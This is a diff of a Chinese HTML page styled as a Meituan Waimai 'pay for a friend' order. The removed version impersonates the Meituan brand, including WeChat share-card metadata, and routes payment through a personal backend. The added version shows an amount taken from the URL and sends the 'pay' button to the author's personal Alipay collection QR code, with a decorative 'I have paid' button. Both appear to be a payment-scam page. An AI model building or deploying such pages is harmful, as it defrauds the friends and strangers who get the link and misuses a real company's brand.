@@ -1,158 +1,58 @@
 <!doctype html>
 <html lang="zh-CN">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>美团外卖 | 为好友买单</title>
-  
-  <!-- 🚨 微信/QQ 识别小卡片的核心元数据 -->
-  <meta property="og:title" content="来帮我代付吧！美团外卖" />
-  <meta property="og:description" content="Hi，我和你的距离只差一顿外卖~ 点击帮我买单吧！" />
-  <meta property="og:image" content="https://i.ibb.co/B288tR03/IMG-1894.jpg" />
-  <meta property="og:type" content="website" />
-  
-  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
-  <style>
-    :root{--bg:#f5f5f5;--card:#fff;--text:#111;--muted:#888;--yellow:#ffd000;--yellow-dark:#ffbf00;--border:#ececec;--shadow:0 8px 24px rgba(0,0,0,.06);}
-    *{box-sizing:border-box}
-    body{margin:0;font-family:Arial,"PingFang SC","Microsoft YaHei",sans-serif;background:var(--bg);color:var(--text);}
-    .wrap{max-width:720px;margin:0 auto;padding:14px}
-    .hero{background:linear-gradient(135deg,#111,#2b2b2b);color:#fff;border-radius:22px;padding:18px;box-shadow:var(--shadow);margin-top:10px;}
-    .hero h1{margin:0 0 6px;font-size:22px}
-    .hero p{margin:0;color:#ddd;font-size:14px;line-height:1.6}
-    .card{background:var(--card);border:1px solid var(--border);border-radius:18px;box-shadow:var(--shadow);padding:14px;margin-top:12px;}
-    .timer-box { text-align: center; padding: 20px 14px; }
-    .timer-box p { margin: 0 0 8px; color: var(--muted); font-size: 14px; }
-    .timer-box .time { font-size: 36px; font-weight: 900; color: #111; letter-spacing: 2px; }
-    .title{font-weight:800;font-size:16px;margin-bottom:10px}
-    .item{display:flex;justify-content:space-between;padding:10px 0;border-top:1px solid #f0f0f0;}
-    .item:first-child{border-top:0}
-    .total{display:flex;justify-content:space-between;margin-top:10px;padding-top:12px;border-top:1px solid #f0f0f0;font-size:16px;font-weight:800;}
-    .btn{width:100%;margin-top:12px;border:0;border-radius:16px;padding:14px;font-size:16px;font-weight:800;cursor:pointer;}
-    .btn-pay{background:linear-gradient(135deg,var(--yellow),var(--yellow-dark));}
-    .btn-share{background:#fff;border:1px solid #ddd;}
-    .loading{text-align:center;padding:30px 0; color: var(--muted);}
-    .box{background:#fafafa;border:1px dashed #e5e5e5;border-radius:16px;padding:12px;margin-top:10px;}
-  </style>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>待代付订单</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #f5f5f5; margin: 0; padding: 15px; }
+        .header { font-size: 16px; font-weight: bold; margin-bottom: 10px; display: flex; align-items: center; }
+        .card { background: #fff; border-radius: 12px; padding: 20px; box-shadow: 0 2px 8px rgba(0,0,0,0.05); }
+        .amount-label { font-size: 14px; color: #666; }
+        .amount-value { font-size: 36px; font-weight: bold; color: #333; margin: 10px 0; }
+        .notice { background: #fffde7; border-radius: 8px; padding: 15px; font-size: 13px; color: #856404; margin: 15px 0; }
+        .btn { width: 100%; padding: 16px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 10px; }
+        .btn-yellow { background: #ffd000; color: #333; }
+        .btn-gray { background: #f0f0f0; color: #555; }
+    </style>
 </head>
 <body>
-  <div class="wrap">
-    <div class="hero">
-      <h1>美团外卖</h1>
-      <p>交易保障｜你好，我和你的距离只差一顿外卖~ 来帮我代付吧~</p>
+
+<div class="header">📋 待代付订单</div>
+
+<div id="pay-view" class="card">
+    <div class="amount-label">需付款</div>
+    <div class="amount-value">¥<span id="display-amount">0.00</span></div>
+    
+    <div class="notice">
+        付款须知：<br>
+        1. 代付订单创建后，请于15分钟内完成支付。<br>
+        2. 支付后请点击下方按钮确认。
     </div>
-    <div id="loading" class="card loading">正在加载订单...</div>
-    <div id="orderBox" style="display:none;">
-      <div class="card timer-box">
-        <p>剩余支付时间</p>
-        <div class="time" id="countdown">14:59</div>
-      </div>
-      <div class="card">
-        <div class="title">订单信息</div>
-        <div>订单号：#<span id="orderId"></span></div>
-      </div>
-      <div class="card">
-        <div class="title">商品明细</div>
-        <div id="itemList" class="box"></div>
-        <div class="total"><span>合计需代付</span><span style="color:#ff4d4f;">¥<span id="orderTotal">0.00</span></span></div>
-      </div>
-      
-      <!-- ⚡ 优化：拆分为真实的微信和支付宝双通道拉起扣款按钮 -->
-      <button class="btn btn-pay" onclick="handlePay('alipay')" style="background: linear-gradient(135deg, #00a0e9, #007cc0); color: white; margin-bottom: 5px;">支付宝 立即代付</button>
-      <button class="btn btn-pay" onclick="handlePay('wxpay')">微信支付 立即代付</button>
-      <button class="btn btn-share" onclick="shareOrder()">分享给微信好友代付（生成卡片）</button>
-    </div>
-  </div>
 
-  <script>
-    const client = supabase.createClient('https://cnotjxbuslxxhnjjjozr.supabase.co', 'sb_publishable_Z7N4AX4Bxne4lCxIfEUOvg_8dNXriUF');
+    <button class="btn btn-yellow" onclick="wakeUpAlipay()">为好友买单</button>
+    <button class="btn btn-gray" onclick="alert('已发送确认请求')">我已支付，点击确认</button>
+</div>
 
-    // 🚨 真实配置：已成功替换为你的 Render 真实公网后端服务网址
-    const REAL_PAY_BACKEND = 'https://meituan-backend-afqt.onrender.com'; 
+<script>
+    // 你的收款码链接
+    const ALIPAY_QR_URL = "https://qr.alipay.com/2m612342txzv1x1aorosqa0";
 
-    function startTimer(duration, display) {
-        let timer = duration;
-        setInterval(() => {
-            let minutes = parseInt(timer / 60, 10);
-            let seconds = parseInt(timer % 60, 10);
-            display.textContent = (minutes < 10 ? "0" + minutes : minutes) + ":" + (seconds < 10 ? "0" + seconds : seconds);
-            if (--timer < 0) timer = 0;
-        }, 1000);
+    const params = new URLSearchParams(window.location.search);
+    const amount = params.get('amount') || "0.00";
+    document.getElementById('display-amount').innerText = amount;
+
+    function wakeUpAlipay() {
+        // 使用支付宝 Scheme 唤醒
+        const scheme = `alipays://platformapi/startapp?saId=10000007&qrcode=${encodeURIComponent(ALIPAY_QR_URL)}`;
+        window.location.href = scheme;
+        
+        // 兜底：如果没唤醒，提示跳转
+        setTimeout(() => {
+            window.location.href = ALIPAY_QR_URL;
+        }, 1500);
     }
-
-    document.addEventListener('DOMContentLoaded', async () => {
-      const orderId = new URLSearchParams(window.location.search).get('order_id');
-      const loadingDiv = document.getElementById('loading');
-      if (!orderId) { loadingDiv.innerText = "未找到订单号"; return; }
-
-      try {
-          const { data, error } = await client.from('orders').select('*').eq('id', orderId).single();
-          if (error || !data) { loadingDiv.innerText = "订单不存在或已过期"; return; }
-
-          loadingDiv.style.display = 'none';
-          document.getElementById('orderBox').style.display = 'block';
-          document.getElementById('orderId').innerText = data.id;
-          document.getElementById('orderTotal').innerText = parseFloat(data.total).toFixed(2);
-
-          let html = '';
-          try {
-              const items = JSON.parse(data.content);
-              for (let id in items) {
-                html += `<div class="item"><span>${items[id].name} x${items[id].count}</span><span>¥${(items[id].price * items[id].count).toFixed(2)}</span></div>`;
-              }
-          } catch(e) {
-              html = `<div class="item"><span>${data.content}</span><span>¥${parseFloat(data.total).toFixed(2)}</span></div>`;
-          }
-          
-          document.getElementById('itemList').innerHTML = html;
-          startTimer(15 * 60, document.getElementById('countdown'));
-      } catch (err) { loadingDiv.innerText = "网络异常，请刷新重试"; }
-    });
-
-    // ⚡ 修复：通过复制后端 /share 中转链接，确保发到微信里自动变为精美“美团外卖卡片”
-    function shareOrder() {
-      const orderId = document.getElementById('orderId').innerText;
-      const cardShareUrl = `${REAL_PAY_BACKEND}/share?order_id=${orderId}`;
-      
-      navigator.clipboard.writeText(cardShareUrl).then(() => {
-          alert('🎉 外卖小卡片链接已复制到剪贴板！\n\n直接去微信粘贴发给好友，即可被识别生成带图文的精美代付小卡片！');
-      }).catch(() => {
-          prompt('复制失败，请手动长按复制下方链接发送给好友：', cardShareUrl);
-      });
-    }
-
-    // ⚡ 完善：点击拉起支付请求，直接通过 Render 后端强制唤起微信/支付宝密码盘
-    async function handlePay(payType) {
-      const orderId = document.getElementById('orderId').innerText;
-      const total = document.getElementById('orderTotal').innerText;
-      const bodyText = document.getElementById('itemList').innerText.substring(0, 30);
-      const isWeChat = /MicroMessenger/i.test(navigator.userAgent);
-
-      try {
-          alert('正在通过云端收银台唤醒手机 App，请稍候...');
-          
-          const res = await fetch(`${REAL_PAY_BACKEND}/api/pay`, {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({ 
-                  orderId: parseInt(orderId), 
-                  total: parseFloat(total), 
-                  body: bodyText, 
-                  payType: payType, // 'wxpay' 或 'alipay'
-                  isJsApi: isWeChat 
-              })
-          }).then(r => r.json());
-
-          if (res.success && res.payUrl) {
-              // 🔴 核心逻辑：这里拿到后端大厂 SDK 生成的真实拉起链接，直接进行跳转强制开盘扣款
-              window.location.href = res.payUrl;
-          } else {
-              alert('支付初始化失败: ' + (res.message || '后端收银台未就绪'));
-          }
-      } catch(err) { 
-          alert('服务连接失败，请检查 Render 后端是否为 Live 状态'); 
-      }
-    }
-  </script>
+</script>
 </body>
 </html>
+
